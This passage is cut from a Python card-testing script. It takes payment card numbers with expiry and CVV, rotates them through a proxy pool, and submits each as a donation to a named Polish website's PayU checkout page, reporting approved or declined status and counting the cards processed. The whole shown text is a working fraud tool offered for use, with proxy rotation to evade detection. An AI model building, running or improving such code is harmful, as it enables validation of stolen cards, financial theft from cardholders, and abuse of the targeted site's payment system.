                return {"value": "We are unable to authorize your payment.(ERROR)", "status": "declined", "code": "ERROR"}

            # ── STEP 5: Submit payment ──
            payment_result = self.make_payment()
            if not payment_result:
                return {"value": "We are unable to authorize your payment.(ERROR)", "status": "declined", "code": "ERROR"}

            # ── STEP 6/7: 3DS if needed, then check status ──
            if 'continueUrl' in payment_result and payment_result.get('errorCode') is None:
                logger.info("3DS verification required...")
                if not self.handle_3ds_verification():
                    logger.warning("3DS timed out")
                    return {"value": "Additional 3DS step needed.", "status": "declined", "code": "3DS_METHOD_REQUIRED"}

            status_result = self.check_payment_status()
            if not status_result:
                return {"value": "We are unable to authorize your payment.(ERROR)", "status": "declined", "code": "ERROR"}
            return self.determine_status(status_result)

        except Exception as e:
            logger.error(f"Error: {e}")
            import traceback
            traceback.print_exc()
            return {"value": "We are unable to authorize your payment.(ERROR)", "status": "declined", "code": "ERROR"}

    def cleanup(self):
        if self.driver:
            try:
                self.driver.quit()
            except Exception:
                pass
            self.driver = None


# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# PROXY POOL DISPLAY
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

def print_proxy_pool():
    stats = proxy_rotator.get_stats()
    print(f"\n{'─'*60}")
    print(f"  PROXY POOL  [{stats['mode'].upper()}]  ─  {stats['total_proxies']} proxies")
    print(f"{'─'*60}")
    for i, p in enumerate(PROXY_LIST):
        marker = "  ◄" if i == stats['current_index'] else ""
        print(f"  {i+1:2d}. {p['tag']:<16s} {p['host']}:{p['port']}{marker}")
    print(f"{'─'*60}")
    next_idx = stats['current_index'] % stats['total_proxies']
    print(f"  Next: #{next_idx + 1} {PROXY_LIST[next_idx]['tag']}")
    print(f"  Total cards processed: {stats['total_uses']}")
    print(f"{'─'*60}\n")


# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# CLI ENTRY POINT
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

def main():
    print("\n" + "="*60)
    print("  PAYU CHECKOUT PROCESSOR  —  ladnehistorie.pl")
    print("  Proxy Rotation Enabled")
    print("="*60)
    print_proxy_pool()
    print("  Format: card_number|mm|yy|cvv")
    print("  Commands: proxies, exit\n")

    while True:
        try:
            card_input = input("Card (number|mm|yy|cvv): ").strip()
            if not card_input:
                print("Please enter card details!")
                continue
            if card_input.lower() in ('exit', 'quit', 'q'):
                break
            if card_input.lower() in ('proxies', 'pool', 'list'):
                print_proxy_pool()
                continue

            proxy_info = proxy_rotator.get_next()
            processor  = PayUProcessor(proxy_info=proxy_info)
            try:
                result = processor.process(card_input)
                tag = proxy_info.get('tag', 'UNKNOWN')
                print("\n" + "="*60)
                print("  RESULT")
                print("="*60)
                print(f"  Site    : ladnehistorie.pl/en/support-us/")
                print(f"  Proxy   : {tag} ({proxy_info['host']}:{proxy_info['port']})")
                print(f"  Name    : {processor.first_name} {processor.last_name}")
                print(f"  Email   : {processor.email}")
                print(f"  Status  : {result.get('status', 'unknown').upper()}")
                print(f"  Message : {result.get('value', 'N/A')}")
                print(f"  Code    : {result.get('code', 'N/A')}")
                stats = proxy_rotator.get_stats()
                next_idx = stats['current_index'] % stats['total_proxies']
                print(f"  Next    : #{next_idx + 1} {PROXY_LIST[next_idx]['tag']}")
                print("="*60 + "\n")
            finally:
                processor.cleanup()

        except KeyboardInterrupt:
            print("\nExiting...")
            break
        except Exception as e:
            print(f"Error: {e}")
            import traceback
            traceback.print_exc()


if __name__ == "__main__":
    main()
